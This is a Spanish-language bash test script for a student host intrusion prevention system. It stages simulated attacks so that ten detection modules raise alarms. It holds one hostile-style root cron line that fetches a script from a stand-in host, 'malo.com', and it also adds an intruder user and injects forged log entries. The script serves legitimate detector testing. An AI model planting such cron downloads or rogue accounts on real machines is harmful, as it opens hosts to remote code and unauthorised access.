#!/bin/bash
# ============================================================
# probar_todo.sh - sentinel_hips
# ------------------------------------------------------------
# Simula un ataque para cada modulo del HIPS (los 10).
# El orquestador debe estar CORRIENDO en otra terminal.
#
# COMO FUNCIONA (version rapida):
# Los 10 modulos corren EN PARALELO (cada uno en su hilo), asi que
# no hace falta esperar entre ataque y ataque. Este script:
#   1. Arranca los procesos de fondo (tcpdump, yes) que deben vivir
#      durante toda la ventana de deteccion.
#   2. Dispara todos los ataques "instantaneos" casi sin pausa.
#   3. Espera UNA sola vez el tiempo del modulo mas lento.
#   4. Mata los procesos de fondo.
#
# TIEMPO TOTAL: ~35s si bajaste los intervalos (ver UPDATE de abajo),
#               ~75s si dejaste los intervalos por defecto.
#
# El techo lo pone el modulo mas lento. Con los intervalos por defecto
# son el sniffer (60s) y el cron (60s). Para bajar el total, corre esto
# UNA VEZ en la base (deja los modulos detectando cada 10s):
#
#   UPDATE configuracion_modulos SET valor='10' WHERE modulo='cron'    AND parametro='check_interval';
#   UPDATE configuracion_modulos SET valor='10' WHERE modulo='sniffer' AND parametro='sniffer_check_interval';
#   UPDATE configuracion_modulos SET valor='10' WHERE modulo='correo'  AND parametro='check_interval';
#
# Reinicia el orquestador despues del UPDATE para que tome los valores.
# Con eso, el techo pasa a ser el modulo vi (procesos): 3 lecturas
# sostenidas cada 10s = ~30s.
#
# ESPERA_FINAL controla la unica espera. Ajustalo segun tu config:
#   - intervalos bajados a 10s -> ESPERA_FINAL=35
#   - intervalos por defecto   -> ESPERA_FINAL=75
#
# No limpia los efectos. Para revertir: sudo bash tests/limpiar_pruebas.sh
#
# USO:  sudo bash tests/probar_todo.sh
# ============================================================

DIR="$(dirname "$0")"

# Unica espera del script. Cambia a 75 si NO bajaste los intervalos.
ESPERA_FINAL=35

echo "============================================================"
echo " PRUEBAS DEL HIPS - simulando ataques (10 modulos, en paralelo)"
echo " (el orquestador debe estar corriendo en otra terminal)"
echo " Tiempo total estimado: ~${ESPERA_FINAL}s"
echo "============================================================"
echo ""

# ============================================================
# FASE 1: procesos de fondo (deben vivir durante toda la ventana)
# ============================================================

# --- Modulo iii: sniffer ---
# tcpdump tiene que seguir vivo cuando el modulo iii haga su chequeo.
echo "[iii] Sniffer: lanzando tcpdump (queda vivo toda la ventana)..."
sudo tcpdump -i any > /dev/null 2>&1 &
TCPDUMP_PID=$!

# --- Modulo vi: procesos ---
# 'yes' satura un core. El modulo vi necesita 3 lecturas sostenidas.
echo "[vi] Procesos: generando carga de CPU con 'yes' (queda vivo)..."
yes > /dev/null &
YES_PID=$!

echo ""

# ============================================================
# FASE 2: ataques instantaneos (se disparan todos casi sin pausa)
# ============================================================

# --- Modulo i: integridad ---
echo "[i] Integridad: creando usuario (modifica /etc/passwd y shadow)..."
sudo useradd usuario_intruso 2>/dev/null
echo "    -> MODIFICACION_PASSWD / MODIFICACION_SHADOW"

# --- Modulo vii: /tmp ---
echo "[vii] /tmp: creando ejecutable sospechoso en /tmp..."
echo '#!/bin/bash' > /tmp/malware_prueba.sh
chmod +x /tmp/malware_prueba.sh
echo "    -> ARCHIVO_TMP_SOSPECHOSO"

# --- Modulo iv: scanner HTTP ---
echo "[iv] Scanner HTTP: inyectando 25 x 404 en access.log..."
sudo mkdir -p /var/log/httpd
sudo touch /var/log/httpd/access.log
for i in $(seq 1 25); do
  echo '203.0.113.77 - - [10/Jul/2026:12:00:00] "GET /admin HTTP/1.1" 404 100' | sudo tee -a /var/log/httpd/access.log > /dev/null
done
echo "    -> SCANNER_HTTP (banea 203.0.113.77)"

# --- Modulo viii: DDoS ---
echo "[viii] DDoS: alimentando la captura con el dataset del profesor..."
DNS_FILE=$(ls "$DIR"/*DNS*tcpdump.txt 2>/dev/null | head -1)
if [ -n "$DNS_FILE" ]; then
  sudo cat "$DNS_FILE" >> /var/log/hips/captura_dns.txt
  echo "    -> DDOS_DETECTADO (usa: $(basename "$DNS_FILE"))"
else
  echo "    (no se encontro el dataset DNS en $DIR, se omite)"
fi

# --- Modulo ix: cron ---
echo "[ix] Cron: creando tarea de cron sospechosa..."
echo "* * * * * root wget http://malo.com/x.sh -O /tmp/x.sh" | sudo tee /etc/cron.d/tarea_prueba > /dev/null
echo "    -> CRON_SOSPECHOSO"

# --- Modulo x: accesos invalidos ---
# Formato CON IP (estilo SSH): el modulo x agrupa por IP y banea, sin
# tocar /etc/passwd. El iv tambien vera estas lineas y disparara
# FAILED_LOGIN_MULTIPLE (solo alarma); eso es esperado.
# OJO CON EL UMBRAL: el x usa 'max_failed_attempts' de la base. Con 10
# fallos superamos el umbral tipico (5-8). Si lo subes en la web, sube
# tambien este numero.
echo "[x] Accesos: inyectando 10 fallos de login CON IP en /var/log/secure..."
FECHA=$(date '+%b %e %H:%M:%S')
for i in $(seq 1 10); do
  echo "$FECHA tera sshd[812]: Failed password for root from 198.51.100.23 port 4444 ssh2" | sudo tee -a /var/log/secure > /dev/null
done
echo "    -> ACCESO_INVALIDO_REPETIDO (banea 198.51.100.23)"

# --- Modulo v: cola de correo ---
# El modulo v mira la cola de Postfix con 'mailq'. Necesitamos que 60
# mails QUEDEN en cola, sin romper el correo de alarmas del sistema.
# Combinamos dos tecnicas:
#
#   1. DEFER de la entrega saliente (defer_transports=smtp). Esto hace
#      que los mails a 'prueba.local' queden VARADOS en la cola en vez
#      de entregarse o rebotar -> mailq los cuenta y el v los detecta.
#      Clave: defer_transports SOLO frena la entrega saliente por SMTP;
#      el correo LOCAL (el mailer entrega a asd@localhost por el transport
#      'local') sigue funcionando. Verificado: con defer activo, el mailer
#      sigue mandando los emails de alarma sin problema.
#
#   2. REMITENTE DISTINTO por mail. El modulo iv vigila el maillog y
#      cuenta mails POR REMITENTE (from=<...>); si una cuenta supera 15,
#      lo toma como spam y APAGA Postfix (bajar_correo()), rompiendo el
#      mailer. Usando spammer1..spammer60 como remitentes, ninguna cuenta
#      pasa de 1, el iv no dispara, y el v igual ve los 60 en cola (cuenta
#      el TOTAL, no por remitente). Asi los modulos iv y v no se pisan.
#
# El estado defer se restaura en limpiar_pruebas.sh (guardamos el valor
# previo en un .bak).
echo "[v] Cola de correo: defer + encolando 60 mails (remitente unico c/u)..."
if command -v postfix >/dev/null 2>&1 && command -v sendmail >/dev/null 2>&1; then
  # Guardar el defer_transports actual para restaurarlo en la limpieza
  DEFER_PREVIO=$(sudo postconf -h defer_transports 2>/dev/null)
  echo "$DEFER_PREVIO" | sudo tee /var/log/hips/defer_transports.bak > /dev/null

  # Congelar SOLO la entrega saliente (el correo local sigue andando)
  sudo postconf -e "defer_transports = smtp" 2>/dev/null
  sudo postfix reload >/dev/null 2>&1

  # Encolar 60 mails con remitentes distintos: quedan varados en la cola
  for i in $(seq 1 60); do
    echo "prueba cola $i" | sudo sendmail -f "spammer${i}@prueba.local" destino@prueba.local 2>/dev/null
  done
  echo "    -> MAIL_QUEUE_ALTA (origen 'correo'; defer + remitentes unicos)"
else
  echo "    (postfix/sendmail no disponibles, se omite el modulo v)"
fi

# ============================================================
# FASE 3: una sola espera para que todos los modulos detecten
# ============================================================
echo ""
echo "    Todos los ataques disparados. Esperando ${ESPERA_FINAL}s para que"
echo "    los modulos completen sus ciclos de deteccion (en paralelo)..."
echo "    (los mas lentos: sniffer, cron, y procesos con 3 lecturas)"
sleep "$ESPERA_FINAL"

# ============================================================
# FASE 4: apagar los procesos de fondo
# ============================================================
kill $YES_PID 2>/dev/null
kill $TCPDUMP_PID 2>/dev/null

echo ""
echo "============================================================"
echo " Pruebas terminadas."
echo " Revisa el dashboard web para ver las 10 alarmas."
echo ""
echo " Recordatorios de lectura:"
echo "  - Modulo v: la alarma MAIL_QUEUE_ALTA debe tener ORIGEN 'correo'"
echo "    (la de origen 'logs' es del modulo iv, es otra cosa)."
echo "  - Modulo x: ACCESO_INVALIDO_REPETIDO con origen 'accesos'"
echo "    (el FAILED_LOGIN_MULTIPLE con origen 'logs' es del iv)."
echo ""
echo " Si algun modulo lento no salio, tu ESPERA_FINAL es muy corta"
echo " para tu config: subila (arriba del script) o baja los intervalos"
echo " en la base (ver el UPDATE comentado en la cabecera)."
echo ""
echo " Para revertir los efectos (incluye descongelar Postfix):"
echo "   sudo bash tests/limpiar_pruebas.sh"
echo "============================================================"
